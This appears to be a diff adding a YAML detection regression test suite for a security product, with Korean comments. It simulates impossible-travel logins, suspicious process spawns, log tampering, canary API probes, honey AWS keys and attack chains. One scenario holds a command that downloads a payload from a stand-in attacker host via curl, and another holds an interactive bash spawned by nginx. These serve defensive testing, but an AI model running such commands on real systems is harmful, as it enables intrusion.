@@ -1,0 +1,458 @@
+# InfraRed v8.0 BAS 탐지 회귀 테스트 시나리오
+# 설계서: InfraRed_v8_보안심화_설계서.md §14
+#
+# 실행: python backend/tests/detection/runner.py --suite v8
+#
+# 시나리오 필드:
+#   description         — 테스트 의도 설명
+#   steps               — 공격 시뮬레이션 단계 목록
+#   must_create_incident— true이면 인시던트가 생성되어야 함
+#   must_not_create_incident — true이면 인시던트가 생성되지 않아야 함 (FP 검증)
+#   expected_rule_id    — 기대하는 룰 ID
+#   expected_severity   — 기대하는 심각도
+#   expected_confidence_gte — 최소 기대 신뢰도
+
+v8_scenarios:
+
+  # ─────────────────────────────────────────────────────────────────
+  # TRAVEL-001: Impossible Travel
+  # ─────────────────────────────────────────────────────────────────
+
+  impossible_travel_critical:
+    description: >
+      서울 IP로 로그인 후 10분 뒤 뉴욕 IP로 동일 계정 로그인.
+      물리적으로 불가능한 이동(~65,000 km/h) → CRITICAL 경보 필수.
+    steps:
+      - login:
+          account: admin@example.com
+          source_ip: "211.49.0.1"          # 서울 (KT)
+          city: Seoul
+          country: KR
+          latitude: 37.5665
+          longitude: 126.9780
+          timestamp: "T+0"
+      - login:
+          account: admin@example.com
+          source_ip: "72.229.28.185"        # 뉴욕 (Verizon)
+          city: New York
+          country: US
+          latitude: 40.7128
+          longitude: -74.0060
+          timestamp: "T+10min"
+    must_create_incident: true
+    expected_rule_id: "TRAVEL-001"
+    expected_severity: "CRITICAL"
+    expected_confidence_gte: 0.97
+
+  impossible_travel_false_positive_vpn:
+    description: >
+      국내 VPN 전환 — 서울 IP1 → 서울 IP2 (거리 ~50km).
+      MIN_DISTANCE_KM(500km) 미만이므로 탐지 안 됨.
+    steps:
+      - login:
+          account: admin@example.com
+          source_ip: "211.49.0.1"
+          city: Seoul
+          country: KR
+          latitude: 37.5665
+          longitude: 126.9780
+          timestamp: "T+0"
+      - login:
+          account: admin@example.com
+          source_ip: "175.213.0.100"
+          city: Suwon
+          country: KR
+          latitude: 37.2636
+          longitude: 127.0286
+          timestamp: "T+5min"
+    must_not_create_incident: true
+
+  impossible_travel_false_positive_same_country:
+    description: >
+      국내 장거리 이동 (서울 → 부산, ~325km) — 기차 가능 거리.
+      속도가 항공기 미만 + 거리 500km 미만 → 탐지 안 됨.
+    steps:
+      - login:
+          account: user@example.com
+          source_ip: "1.209.0.1"
+          city: Seoul
+          country: KR
+          latitude: 37.5665
+          longitude: 126.9780
+          timestamp: "T+0"
+      - login:
+          account: user@example.com
+          source_ip: "175.120.0.1"
+          city: Busan
+          country: KR
+          latitude: 35.1796
+          longitude: 129.0756
+          timestamp: "T+3h"
+    must_not_create_incident: true
+
+  # ─────────────────────────────────────────────────────────────────
+  # EXEC-ANCESTRY-001/002: Process Ancestry Tripwire
+  # ─────────────────────────────────────────────────────────────────
+
+  process_ancestry_nginx_bash:
+    description: >
+      nginx → bash 프로세스 계보.
+      ALWAYS_SUSPICIOUS에 포함된 조합 → 즉시 CRITICAL.
+    steps:
+      - process_spawn:
+          parent_name: nginx
+          parent_pid: 1234
+          child_name: bash
+          child_pid: 5678
+          exe_path: /bin/bash
+          cmdline: "bash -i"
+    must_create_incident: true
+    expected_rule_id: "EXEC-ANCESTRY-001"
+    expected_severity: "CRITICAL"
+    expected_confidence_gte: 0.95
+
+  process_ancestry_php_fpm_curl:
+    description: >
+      php-fpm → curl 실행 — 웹셸에서 C2 서버로 curl 다운로드 의심.
+      ALWAYS_SUSPICIOUS 조합 → CRITICAL.
+    steps:
+      - process_spawn:
+          parent_name: php-fpm
+          parent_pid: 2000
+          child_name: curl
+          child_pid: 9001
+          exe_path: /usr/bin/curl
+          cmdline: "curl http://attacker.example.com/payload -o /tmp/a.out"
+    must_create_incident: true
+    expected_rule_id: "EXEC-ANCESTRY-001"
+    expected_severity: "CRITICAL"
+
+  process_ancestry_new_pair:
+    description: >
+      처음 관찰된 부모-자식 조합 (custom-daemon → python3).
+      ALWAYS_SUSPICIOUS 아님 + 처음 보는 조합 → HIGH (EXEC-ANCESTRY-002).
+    steps:
+      - process_spawn:
+          parent_name: custom-daemon
+          parent_pid: 3000
+          child_name: python3
+          child_pid: 4000
+          exe_path: /usr/bin/python3
+          cmdline: "python3 /opt/app/worker.py"
+    must_create_incident: true
+    expected_rule_id: "EXEC-ANCESTRY-002"
+    expected_severity: "HIGH"
+    expected_confidence_gte: 0.75
+
+  process_ancestry_whitelist_cron:
+    description: >
+      cron → bash 실행 — ALWAYS_NORMAL 화이트리스트 포함.
+      정상 cron 스크립트 실행 → 탐지 안 됨.
+    steps:
+      - process_spawn:
+          parent_name: cron
+          parent_pid: 100
+          child_name: bash
+          child_pid: 200
+          exe_path: /bin/bash
+          cmdline: "bash /etc/cron.daily/cleanup"
+    must_not_create_incident: true
+
+  # ─────────────────────────────────────────────────────────────────
+  # TAMPER-LOG-001/002: Log Entropy Sentinel
+  # ─────────────────────────────────────────────────────────────────
+
+  log_entropy_ransomware:
+    description: >
+      /var/log/auth.log 내용을 무작위 바이트로 덮어씀.
+      Shannon 엔트로피 ≥ 7.5 → 랜섬웨어 암호화 의심 CRITICAL.
+    steps:
+      - overwrite_log:
+          path: /var/log/auth.log
+          content_type: random_bytes
+          size: 4096
+    must_create_incident: true
+    expected_rule_id: "TAMPER-LOG-001"
+    expected_severity: "CRITICAL"
+    expected_confidence_gte: 0.90
+
+  log_entropy_wipe_size_drop:
+    description: >
+      /var/log/nginx/access.log 파일 크기를 원본의 10%로 truncate.
+      크기 70% 이상 급감 → 공격자 흔적 삭제 의심 CRITICAL.
+    steps:
+      - truncate_log:
+          path: /var/log/nginx/access.log
+          original_size_bytes: 500000
+          new_size_bytes: 5000
+    must_create_incident: true
+    expected_rule_id: "TAMPER-LOG-002"
+    expected_severity: "CRITICAL"
+    expected_confidence_gte: 0.92
+
+  log_entropy_normal:
+    description: >
+      정상 로그 파일 — 엔트로피 3.5~5.5 범위, 크기 안정적.
+      탐지 안 됨.
+    steps:
+      - check_log:
+          path: /var/log/auth.log
+          content_type: normal_text
+    must_not_create_incident: true
+
+  # ─────────────────────────────────────────────────────────────────
+  # CANARY-API-001: Canary API Route
+  # ─────────────────────────────────────────────────────────────────
+
+  canary_api_fuzzing_debug:
+    description: >
+      숨겨진 /api/internal/debug-panel 경로 접근.
+      정상 클라이언트는 절대 이 경로를 호출하지 않음 → HIGH.
+    steps:
+      - http_request:
+          method: GET
+          path: /api/internal/debug-panel
+          source_ip: "203.0.113.1"
+          user_agent: "sqlmap/1.7"
+    must_create_incident: true
+    expected_rule_id: "CANARY-API-001"
+    expected_severity: "HIGH"
+    expected_confidence_gte: 0.93
+
+  canary_api_fuzzing_admin:
+    description: >
+      /api/v0/admin-access POST 요청 — API 퍼징 또는 명세 유출 의심.
+    steps:
+      - http_request:
+          method: POST
+          path: /api/v0/admin-access
+          source_ip: "198.51.100.5"
+          user_agent: "python-requests/2.31.0"
+    must_create_incident: true
+    expected_rule_id: "CANARY-API-001"
+    expected_severity: "HIGH"
+
+  canary_api_fuzzing_config_dump:
+    description: >
+      /api/internal/config-dump 접근 — 설정 유출 시도 의심.
+    steps:
+      - http_request:
+          method: GET
+          path: /api/internal/config-dump
+          source_ip: "192.0.2.99"
+          user_agent: "curl/7.88.1"
+    must_create_incident: true
+    expected_rule_id: "CANARY-API-001"
+    expected_severity: "HIGH"
+
+  # ─────────────────────────────────────────────────────────────────
+  # EXEC-FIRST-001/002: First-Execution Alert
+  # ─────────────────────────────────────────────────────────────────
+
+  first_exec_system_binary_replaced:
+    description: >
+      /usr/bin/ssh가 알려지지 않은 해시로 교체된 후 실행됨.
+      시스템 경로 + 알 수 없는 해시 → 공급망 공격 의심 CRITICAL.
+    steps:
+      - exec_binary:
+          exe_path: /usr/bin/ssh
+          sha256: "aabbccdd11223344aabbccdd11223344aabbccdd11223344aabbccdd11223344"
+          pid: 7777
+          parent_name: bash
+          cmdline: "ssh root@internal-server"
+          known_hash: false
+    must_create_incident: true
+    expected_rule_id: "EXEC-FIRST-001"
+    expected_severity: "CRITICAL"
+    expected_confidence_gte: 0.88
+
+  first_exec_new_custom_binary:
+    description: >
+      /opt/myapp/worker 신규 배포 바이너리 첫 실행.
+      일반 경로 + 처음 보는 해시 → 검토 필요 MEDIUM.
+    steps:
+      - exec_binary:
+          exe_path: /opt/myapp/worker
+          sha256: "deadbeef00112233deadbeef00112233deadbeef00112233deadbeef00112233"
+          pid: 8888
+          parent_name: systemd
+          cmdline: "/opt/myapp/worker --config /etc/myapp/config.yaml"
+          known_hash: false
+    must_create_incident: true
+    expected_rule_id: "EXEC-FIRST-002"
+    expected_severity: "MEDIUM"
+
+  first_exec_known_binary:
+    description: >
+      이미 베이스라인에 등록된 /usr/bin/python3 실행.
+      알려진 해시 → 탐지 안 됨.
+    steps:
+      - exec_binary:
+          exe_path: /usr/bin/python3
+          sha256: "1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
+          pid: 9999
+          parent_name: cron
+          cmdline: "python3 /opt/scripts/cleanup.py"
+          known_hash: true
+    must_not_create_incident: true
+
+  first_exec_exclude_path:
+    description: >
+      /tmp/malware.out 실행 — EXCLUDE_PATHS(/tmp/)에 해당.
+      FIM이 처리하는 경로 → EXEC-FIRST 탐지 안 됨.
+    steps:
+      - exec_binary:
+          exe_path: /tmp/malware.out
+          sha256: "ffffffff00000000ffffffff00000000ffffffff00000000ffffffff00000000"
+          pid: 6666
+          parent_name: bash
+          cmdline: "/tmp/malware.out"
+          known_hash: false
+    must_not_create_incident: true
+
+  # ─────────────────────────────────────────────────────────────────
+  # DECEPTION-003: AWS Honey Access Key
+  # ─────────────────────────────────────────────────────────────────
+
+  honey_aws_key_external_use:
+    description: >
+      Honey AWS Access Key가 외부 IP에서 실제 AWS API 호출에 사용됨.
+      미끼 파일 탈취 후 외부 사용 = 침해 확정에 가까움 → CRITICAL 0.99.
+    steps:
+      - cloudtrail_event:
+          access_key_id: "AKIAFAKE_HONEY_000TEST"
+          event_name: "DescribeInstances"
+          source_ip: "185.220.101.50"       # 외부 공격자 IP
+          event_id: "test-ct-event-001"
+    must_create_incident: true
+    expected_rule_id: "DECEPTION-003"
+    expected_severity: "CRITICAL"
+    expected_confidence_gte: 0.99
+
+  honey_aws_key_no_key_configured:
+    description: >
+      Honey Key가 설정되지 않은 테넌트 → CloudTrail 폴링 생략.
+      아무런 인시던트도 생성되지 않아야 함.
+    steps:
+      - cloudtrail_event:
+          access_key_id: "AKIAFAKE_NOT_CONFIGURED"
+          event_name: "ListBuckets"
+          source_ip: "1.2.3.4"
+          event_id: "test-ct-event-002"
+          honey_key_configured: false
+    must_not_create_incident: true
+
+  # ─────────────────────────────────────────────────────────────────
+  # JIT SSH (PERSIST-JIT)
+  # ─────────────────────────────────────────────────────────────────
+
+  jit_ssh_ttl_expiry:
+    description: >
+      JIT SSH 키 주입 후 TTL 10분 만료 → 자동 삭제 확인.
+      authorized_keys가 다시 비어야 하고 audit 로그가 기록되어야 함.
+    steps:
+      - inject_temp_ssh_key:
+          public_key: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI_TEST_HONEY_KEY test@infrared"
+          ttl_minutes: 10
+          user: deploy
+      - wait_seconds: 660          # 11분
+    must_pass:
+      authorized_keys_empty: true
+      audit_log_recorded: true
+
+  jit_ssh_invalid_key:
+    description: >
+      잘못된 형식의 공개키로 inject 시도.
+      키 형식 오류 → 주입 거부, authorized_keys 변경 없음.
+    steps:
+      - inject_temp_ssh_key:
+          public_key: "INVALID_KEY_FORMAT_NOT_A_VALID_SSH_KEY"
+          ttl_minutes: 10
+          user: deploy
+    must_pass:
+      inject_rejected: true
+      authorized_keys_unchanged: true
+
+  jit_ssh_manual_revoke:
+    description: >
+      주입된 키를 TTL 만료 전에 수동으로 revoke.
+      즉시 삭제되고 revoke_reason='manual'이 기록되어야 함.
+    steps:
+      - inject_temp_ssh_key:
+          public_key: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI_REVOKE_TEST test@infrared"
+          ttl_minutes: 30
+          user: deploy
+      - revoke_temp_ssh_key:
+          command_id: "<from_inject_result>"
+    must_pass:
+      authorized_keys_empty: true
+      revoke_reason: "manual"
+
+  # ─────────────────────────────────────────────────────────────────
+  # 복합 공격 체인 (v8.0 연동)
+  # ─────────────────────────────────────────────────────────────────
+
+  supply_chain_attack_chain:
+    description: >
+      공급망 공격 체인: 시스템 바이너리 교체 → EXEC-FIRST-001 → PERSIST 시도.
+      SUPPLY_CHAIN_BINARY_REPLACEMENT 시나리오 트리거 필수.
+    steps:
+      - exec_binary:
+          exe_path: /usr/bin/ssh
+          sha256: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+          known_hash: false
+          is_system_path: true
+      - fim_event:
+          path: /root/.ssh/authorized_keys
+          event_type: modified
+    must_create_incident: true
+    expected_rule_id: "EXEC-FIRST-001"
+    expected_severity: "CRITICAL"
+
+  account_takeover_chain:
+    description: >
+      계정 탈취 체인: Impossible Travel → auth 성공 → authorized_keys 변경.
+      SSH_ACCOUNT_COMPROMISE_WITH_PERSISTENCE 신뢰도 대폭 상승 기대.
+    steps:
+      - login:
+          account: admin@example.com
+          source_ip: "211.49.0.1"
+          city: Seoul
+          country: KR
+          latitude: 37.5665
+          longitude: 126.9780
+          timestamp: "T+0"
+      - login:
+          account: admin@example.com
+          source_ip: "72.229.28.185"
+          city: New York
+          country: US
+          latitude: 40.7128
+          longitude: -74.0060
+          timestamp: "T+10min"
+      - fim_event:
+          path: /root/.ssh/authorized_keys
+          event_type: modified
+    must_create_incident: true
+    expected_rule_id: "TRAVEL-001"
+    expected_severity: "CRITICAL"
+
+  ransomware_precursor_chain:
+    description: >
+      랜섬웨어 전조 체인: 대량 파일 변경(EXEC-003) + 로그 엔트로피 폭등(TAMPER-LOG-001).
+      RANSOMWARE_PRECURSOR 즉시 격리 승인 요청 트리거.
+    steps:
+      - bulk_file_modification:
+          file_count: 150
+          extensions:
+            - .jpg
+            - .docx
+            - .pdf
+          directory: /home/user/documents
+      - overwrite_log:
+          path: /var/log/auth.log
+          content_type: random_bytes
+          size: 4096
+    must_create_incident: true
+    expected_rule_id: "TAMPER-LOG-001"
+    expected_severity: "CRITICAL"
